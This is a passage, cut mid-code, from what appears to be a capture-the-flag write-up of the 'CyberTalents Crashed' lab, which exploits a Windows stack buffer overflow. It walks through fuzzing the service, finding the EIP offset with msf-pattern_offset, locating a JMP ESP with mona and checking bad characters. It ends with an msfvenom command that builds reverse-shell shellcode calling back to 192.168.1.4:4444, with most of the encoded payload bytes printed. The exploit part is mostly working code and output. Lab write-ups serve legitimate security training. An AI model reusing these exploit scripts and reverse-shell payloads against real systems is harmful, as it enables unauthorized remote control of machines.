class="s">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9</span><span class="sh">"</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">192.168.1.6</span><span class="sh">"</span><span class="p">,</span> <span class="mi">13337</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">((</span><span class="sh">'</span><span class="s">SECRET</span><span class="sh">'</span><span class="o">+</span> <span class="nb">buffer</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</pre></table></code></div></div><p>By running this Fuzzer we will notice in the debugger which string has overwrite the EIP.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MdMg4OEcHH2RKjU6GEs%2F-MdMu2yjb5kAiaSXfXv6%2F5.png?alt=media&amp;token=8610c7f1-b9d6-43c9-9937-e9e1b854ce8f" alt="" /></p><p>The EIP points to <code class="language-plaintext highlighter-rouge">33684232</code> So we need to know what this number place between our unique string. Metasploit also provide a tool that we will us in this process.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>root@kali:~/CyberTalents/Crashed# msf-pattern_offset <span class="nt">-l</span> 1500 <span class="nt">-q</span> 33684232
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exact match at offset 998
</pre></table></code></div></div><p>‌ Now let’s edit our script to ensure that the EIP will be overwritten.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="n">sys</span>
<span class="kn">from</span> <span class="n">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">998</span> <span class="o">+</span> <span class="sh">"</span><span class="s">B</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="sh">"</span><span class="s">C</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">498</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">settimeout</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">192.168.1.6</span><span class="sh">"</span><span class="p">,</span> <span class="mi">13337</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">((</span><span class="sh">"</span><span class="s">SECRET</span><span class="sh">"</span><span class="o">+</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</pre></table></code></div></div><p>When run this script we will find in the immunity debugger that the EIP has been overwritten by <code class="language-plaintext highlighter-rouge">BBBB == 424242</code></p><h3 id="jmp-esp"><strong>JMP ESP</strong></h3><p>As I said we need to overwrite the EIP to control the next instruction. we need to point the next instruction to the ESP which we also control it. so need to find the hex number for a JMP ESP instruction. we can utilize Mona to do our Job.</p><p><a href="https://github.com/corelan/mona">https://github.com/corelan/mona</a></p><p>Then, we enter these commands in the immunity debugger:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>!mona modules
!mona find -s '\xff\xe4'  -m essfunc.dll
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MdMg4OEcHH2RKjU6GEs%2F-MdN-610GjiFEqMPJkCf%2F6.png?alt=media&amp;token=0eb5d6ba-873c-4113-b05b-efd537b87fac" alt="" /></p><p>we can choose between these pointers as long as all protection are disabled.</p><h3 id="check-bad-chars"><strong>Check Bad-Chars</strong></h3><p>Now, before we create our exploit we need to find the bad character that will prevent our exploit form running. we can use this script to check the bad-chars.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="n">sys</span>
<span class="kn">from</span> <span class="n">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="n">badchars</span> <span class="o">=</span> <span class="p">(</span><span class="sh">"</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span class="sh">"</span>
<span class="sh">"</span><span class="se">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="sh">"</span><span class="p">)</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">998</span> <span class="o">+</span> <span class="sh">"</span><span class="se">\xA0\x12\x50\x62</span><span class="sh">"</span> <span class="o">+</span> <span class="n">badchars</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">settimeout</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">192.168.1.6</span><span class="sh">"</span><span class="p">,</span> <span class="mi">13337</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">((</span><span class="sh">"</span><span class="s">SECRET</span><span class="sh">"</span><span class="o">+</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</pre></table></code></div></div><p>After running the script we will see the following:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MdMg4OEcHH2RKjU6GEs%2F-MdN1Di88RruG_nJYOdL%2F8.png?alt=media&amp;token=2af1b4d3-2ba7-4846-a1fc-dca0e25399d8" alt="" /></p><p>By doing some eye-process checking we can see that there is no bad chars except <code class="language-plaintext highlighter-rouge">"\x00"</code></p><h3 id="generate-payload"><strong>Generate Payload</strong></h3><p>The last step that we will do to help us create our final exploit is to generate the shell code by using Msfvenom that will allow us to control the machine and obtain a reverse shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>root@kali:~/CyberTalents/Crashed# msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.1.4 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> py <span class="nt">-a</span> x86 –platform windows <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span>
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>0<span class="o">)</span>
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1712 bytes
buf <span class="o">=</span>  b<span class="s2">""</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">29</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">33</span><span class="se">\x</span><span class="s2">25"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">1b</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">7e</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">7e</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">a6</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">c7"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">ee</span><span class="se">\x</span><span class="s2">ca</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\x</span><span class="s2">8a</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">19</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">98</span><span class="se">\x</span><span class="s2">d7</span><span class="se">\x</span><span class="s2">28</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">fe"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">9c</span><span class="se">\x</span><span class="s2">1b</span><span class="se">\x</span><span class="s2">9b</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\x</span><span class="s2">e0</span><span class="se">\x</span><span class="s2">2c</span><span class="se">\x</span><span class="s2">14</span><span class="se">\x</span><span class="s2">f5</span><span class="se">\x</span><span class="s2">07"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">93</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">26</span><span class="se">\x</span><span class="s2">15</span><span class="se">\x</span><span class="s2">8f</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">29</span><span class="se">\x</span><span class="s2">95</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">a4"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">1c</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">98</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">5b"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">d4</span><span class="se">\x</span><span class="s2">a7</span><span class="se">\x</span><span class="s2">9c</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">cb</span><span class="se">\x</span><span class="s2">ee</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">4d"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">9e</span><span class="se">\x</span><span class="s2">8f</span><span class="se">\x</span><span class="s2">93</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">21</span><span class="se">\x</span><span class="s2">59"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">a4</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">14</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">a5</span><span class="se">\x</span><span class="s2">1b</span><span class="se">\x</span><span class="s2">16"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">a0</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">fa</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">26</span><span class="se">\x</span><span class="s2">f1</span><span class="se">\x</span><span class="s2">e0"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">fd</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">82</span><span class="se">\x</span><span class="s2">1e</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\x</span><span class="s2">d0"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">9a</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">a7</span><span class="se">\x</span><span class="s2">01"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">3f</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">2a</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">a9</span><span class="se">\x</span><span class="s2">38"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">25</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">bd</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">27</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">18</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">5e"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">dc</span><span class="se">\x</span><span class="s2">1b</span><span class="se">\x</span><span class="s2">b7</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">1d</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">7c</span><span class="se">\x</span><span class="s2">35</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">2c</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">06"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">b4</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">a6"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">1b</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">3b</span><span class="se">\x</span><span class="s2">87"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">3b</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">dd</span><span class="se">\x</span><span class="s2">f2</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">20"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">9b</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">25</span><span class="se">\x</span><span class="s2">28</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">45"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">9c</span><span class="se">\x</span><span class="s2">b4</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">13</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">d3</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">66"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">df</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">18</span><span class="se">\x</span><span class="s2">d7</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">19</span><span class="se">\x</span><span class="s2">b2</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">0f"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">fd</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">d4</span><span class="se">\x</span><span class="s2">3c</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">27</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">67</span><span class="se">\x</span><span class="s2">81"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">d4</span><span class="se">\x</span><span class="s2">3d</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">f1</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">8f</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">a8</span><span class="se">\x</span><span class="s2">7d</span><span class="se">\x</span><span class="s2">46"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">9b</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">d3"</span>
